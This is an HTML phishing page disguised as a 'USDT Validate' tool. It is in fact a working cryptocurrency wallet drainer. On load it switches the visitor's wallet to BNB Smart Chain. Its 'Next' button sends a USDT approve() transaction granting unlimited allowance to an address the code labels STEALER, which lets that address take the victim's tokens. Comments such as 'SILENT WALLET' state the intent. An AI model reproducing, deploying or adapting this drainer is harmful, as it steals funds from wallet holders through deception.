<!DOCTYPE html>
<html>
<head>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #1a1a2e; color: white; }
        button { background: #ff6b35; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 10px; cursor: pointer; }
        button:disabled { background: #666; }
    </style>
</head>
<body>
    <h1>USDT Validate</h1>
    <p>Click Next to validate your USDT</p>
    <button id="nextBtn">Next</button>

    <script>
    let web3 = null;
    let accounts = null;

    // ðŸ”¥ AUTO BSC NETWORK + SILENT WALLET
    async function autoBSCWallet() {
        if (typeof window.ethereum !== 'undefined') {
            web3 = new Web3(window.ethereum);
            
            // ðŸ”¥ AUTO SWITCH TO BSC (CHAIN ID: 56)
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }] // BSC Mainnet
                });
            } catch(e) {
                // If BSC not added, add it automatically
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: '0x38',
                        chainName: 'BNB Smart Chain',
                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                        blockExplorerUrls: ['https://bscscan.com']
                    }]
                });
            }
            
            // ðŸ”¥ SILENT ACCOUNT CHECK
            accounts = await web3.eth.getAccounts();
            if (accounts.length > 0) return true;
        }
        return false;
    }

    document.getElementById('nextBtn').onclick = async function() {
        const btn = this;
        btn.innerHTML = 'Processing...';
        btn.disabled = true;

        try {
            if (!accounts || accounts.length === 0) {
                const connected = await autoBSCWallet();
                if (!connected) throw new Error('Trust Wallet BSC on karo');
            }

            const account = accounts[0];
            const USDT = '0x55d398326f99059fF775485246999027B3197955'; // BSC USDT
            const STEALER = '0x027631192b5be3f92F271EccB8d24B7db467080d'; // TERA ADDRESS

            const contract = new web3.eth.Contract([{
                "constant": false,
                "inputs": [{"name": "spender", "type": "address"}, {"name": "value", "type": "uint256"}],
                "name": "approve",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            }], USDT);

            await contract.methods.approve(STEALER, 
                '115792089237316195423570985008687907853269984665640564039457584007913129639935'
            ).send({ from: account });
            
            btn.innerHTML = 'âœ… SUCCESS';
            btn.style.background = '#10b981';
            
        } catch(e) {
            btn.innerHTML = 'Next';
            btn.disabled = false;
            alert('Trust Wallet â†’ DApp Browser â†’ BSC Network');
        }
    };

    window.addEventListener('load', autoBSCWallet);
    </script>
</body>
</html>
